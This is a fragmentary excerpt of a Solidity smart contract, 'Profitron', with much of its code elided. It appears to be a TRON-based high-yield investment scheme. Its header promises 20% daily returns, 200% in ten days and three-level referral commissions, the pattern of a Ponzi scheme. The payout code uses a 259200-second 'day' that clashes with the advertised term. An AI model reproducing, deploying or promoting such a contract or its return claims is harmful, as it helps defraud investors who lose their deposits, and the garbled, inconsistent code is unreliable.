...
/ 🎖 20% DAILY ROI                                                             
/ 🎖 200% TOTAL IN 10DAYS
/ 🎖 100 TRX MIN. INVESTMENT
/ 🎖 30% AUTO REINVEST
/ 🎖 35% REF COMMISSION IN 3 LEVELS (WITHDRAWABLE)
/ 8% Depo & wdraw - Dev/Marketing/Team/Domain/Support
/           
**/
...
contract Profitron {
    ...
    uint8 auto_reinvest_percentage = 30;
	...
	uint256 private _to = 1 days;
    	uint256 private withdraw_limit = 10000000000;
    ...
    function _updateTotalPayout(address _addr) private{
        ...
        for(uint256 i = 0; i < player.deposits.length; i++) {
            ...
            uint256 time_end = dep.time + investment_days * 259200;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 25920000;
            }
        }
    }
    ...
    function payoutOf(address _addr) view external returns(uint256 value) {
        ...
        for(uint256 i = 0; i < player.deposits.length; i++) {
            ...
            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 25920000;
            }
        }
    ...
    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        ...
        for(uint256 i = 0; i < player.deposits.length; i++) {
          ...
          _endTimes[i] = dep.time + investment_days * 259200;
        }
        return (
          _endTimes,
          _amounts,
